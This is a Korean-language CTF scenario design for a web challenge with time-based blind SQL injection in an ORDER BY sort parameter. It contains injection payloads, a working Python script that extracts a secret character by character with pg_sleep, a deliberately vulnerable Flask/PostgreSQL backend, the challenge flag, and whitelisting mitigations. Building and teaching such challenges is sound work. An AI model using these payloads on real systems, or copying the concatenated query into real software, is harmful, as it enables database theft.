---
title: Blind SQL Injection in ORDER BY Clause — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, sql-injection, order-by-injection, blind-sqli, time-based]
confidence: high
---

# Blind SQL Injection in ORDER BY Clause — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Sorted Product Gallery (정렬형 상품 갤러리)
- **난이도**: Medium-High
- **핵심 컨셉**: 웹 검색 및 목록 조회 쿼리에서 발생하는 정형적이지 않은 형태의 **SQL 인젝션** 문제입니다. 사용자는 상품 목록을 이름, 가격, 출시일 등의 컬럼 기준으로 오름차순/내림차순 정렬할 수 있습니다. 일반적으로 SQL 쿼리의 `ORDER BY` 절에는 컬럼명이 들어가므로 표준 매개변수 바인딩(Parameterization)이 불가능하거나 까다롭습니다. 개발자는 정렬 인자를 쿼리에 그대로 문자열 결합해 쿼리를 실행하는 과오를 범합니다. 공격자는 정형화된 입력이 들어갈 수 없는 `ORDER BY` 문법 내에 조건 연산자와 지연 함수(`SLEEP` 등)를 삽입해 1글자씩 플래그를 탈취하는 **Time-based Blind SQLi**를 수행합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Product List**: 정렬 기준 버튼(이름순, 가격순)을 클릭하여 목록 결과를 정렬하는 페이지.
- **Backend Service (Python/Flask)**:
  - MySQL 또는 PostgreSQL을 데이터베이스로 활용.
  - 검색 정렬 엔드포인트 `/api/products?sort=column_name` 제공.
- **Flag 위치**:
  - `secrets` 테이블 내 `flag_val` 컬럼에 저장되어 있음.

### 2.2 취약점 지점
1. **Dynamic ORDER BY Clause Concatenation**:
   - 백엔드는 일반 필터링 값에는 `params` 바인딩을 쓰지만, 정렬 대상 컬럼명은 SQL 컴파일 제약으로 인해 문자열 포맷팅을 사용합니다.
   - 예: `query = "SELECT id, name, price FROM products ORDER BY " + sort_col`
   - 공격자는 `sort_col` 입력에 조건식과 데이터베이스 지연 함수를 주입하여 SQLi를 트리거합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 / 파라미터 | 메소드 | 인증 | 입력 값 | 반환 값 | 비고 |
|---------------------|--------|------|---------|---------|------|
| `/api/products?sort=name` | GET | 없음 | `sort` 정렬 컬럼 변수 | 정렬된 제품 리스트 JSON | `sort` 매개변수에 SQLi 취약점 발생 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. ORDER BY 인젝션 가부 판별
정렬 인자에 참/거짓 판단이 가능한 연산을 주입하여 정렬 결과에 변화가 생기거나 응답 시간에 지연이 발생하는지 검증합니다.
- *정상 정렬 요청*: `/api/products?sort=price`
- *지연 인젝션 테스트 (PostgreSQL 예시)*:
  `/api/products?sort=(CASE WHEN (1=1) THEN price ELSE id END)`
  `/api/products?sort=(CASE WHEN (1=2) THEN price ELSE id END)`
  참과 거짓일 때 목록의 정렬 순서가 바뀌는 것을 포착했다면, 조건식 주입이 가능한 상태입니다.

### Step 2. Time-based Blind SQLi 페이로드 작성
만약 응답 결과의 정렬 순서 판별이 어렵다면 확실한 시간차(Time-based) 방식을 사용합니다.
- *페이로드 문법*:
  `(CASE WHEN (조건식) THEN (SELECT pg_sleep(5)) ELSE price END)`
- *동작 분석*: 조건이 참이면 5초간 지연(Sleep)이 발생하고 거짓이면 즉시 응답이 오게 됩니다.

### Step 3. 스크립트를 통한 1바이트씩 플래그 크래킹
공격자는 플래그 값을 한 글자씩 해독하는 자동화 파이썬 스크립트를 작성합니다.
- **Exploit Script (Python)**:
  ```python
  import requests
  import time

  target_url = "http://gallery.challenge.local/api/products"
  flag = ""
  
  for pos in range(1, 40):
      for char_code in range(32, 127):
          # secrets 테이블의 flag_val의 pos번째 글자 아스키코드 비교
          sqli = f"(CASE WHEN (ascii(substr((SELECT flag_val FROM secrets LIMIT 1),{pos},1))={char_code}) THEN (SELECT pg_sleep(3)) ELSE price END)"
          
          start_time = time.time()
          try:
              r = requests.get(target_url, params={"sort": sqli}, timeout=10)
          except requests.exceptions.ReadTimeout:
              # 타임아웃 발생 시 참으로 유추
              flag += chr(char_code)
              print(f"Found char: {flag}")
              break
              
          duration = time.time() - start_time
          if duration >= 2.8:
              flag += chr(char_code)
              print(f"Found char: {flag}")
              break
  ```

### Step 4. flag 획득
스크립트 가동 결과 3초의 응답 지연을 유발하는 아스키코드 비교 조건이 통과되며 최종 플래그(`FLAG{sqli_in_order_by_clause_blind}`)를 획득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Python Flask with PostgreSQL)

```python
# app.py
from flask import Flask, request, jsonify
import psycopg2

app = Flask(__name__)

def get_db_connection():
    return psycopg2.connect(
        host="localhost",
        database="gallery_db",
        user="postgres",
        password="password"
    )

@app.route("/api/products", methods=["GET"])
def get_products():
    # 정렬 컬럼 파라미터 수집 (기본값은 'id')
    sort_column = request.args.get("sort", "id")
    
    # 취약점 지점: 정렬 컬럼명을 쿼리에 문자열 결합 형식으로 전달
    # 일반적인 SQL 파라미터 바인딩 (%s)은 컬럼 이름의 식별자 자리에 사용할 수 없습니다.
    # 안전하게 처리하려면 컬럼 이름의 화이트리스트 검증이 들어가야 합니다.
    query = f"SELECT id, name, price FROM products ORDER BY {sort_column}"
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    try:
        cursor.execute(query)
        rows = cursor.fetchall()
        
        results = []
        for row in rows:
            results.append({"id": row[0], "name": row[1], "price": row[2]})
        return jsonify(results)
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    finally:
        cursor.close()
        conn.close()
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **컬럼명 화이트리스트 매핑 (Strict White-listing of Columns)**:
   - 클라이언트에서 들어오는 정렬 기준명을 직접 SQL에 붙이지 말고, 사전에 지정된 정렬 가능 속성 이름들과만 1대1 대조하여 일치하는 경우에만 대입하도록 고정합니다.
   - **수정 예시**:
     ```python
     allowed_sort_columns = {
         "id": "id",
         "name": "name",
         "price": "price"
     }
     sort_column = request.args.get("sort", "id")
     
     # 화이트리스트 검증을 통과하지 못하면 강제로 기본값으로 변경
     safe_sort = allowed_sort_columns.get(sort_column, "id")
     query = f"SELECT id, name, price FROM products ORDER BY {safe_sort}"
     ```
2. **정렬 제약조건 및 ORM 컴파일러 이용**:
   - Django, SQLAlchemy 등의 안정된 ORM을 사용하면 정렬 대상 필드에 대해 객체 모델 속성 바인딩을 통해 내부 검증을 대신 수행하여 문자열 주입 위협을 감소시킵니다.
